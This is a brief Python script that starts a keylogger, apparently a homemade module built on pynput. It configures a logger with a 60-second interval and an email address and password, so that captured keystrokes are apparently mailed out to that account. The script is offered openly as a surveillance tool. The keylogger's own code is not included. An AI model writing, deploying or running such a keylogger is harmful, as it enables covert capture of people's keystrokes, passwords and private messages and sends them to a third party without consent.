#!/usr/bin/env python3
'''
    Reference:
        https://pypi.org/project/pynput/
'''
import keylogger

my_logger = keylogger.Logger(60, "mail@gmail.com", "passkey")
my_logger.start()
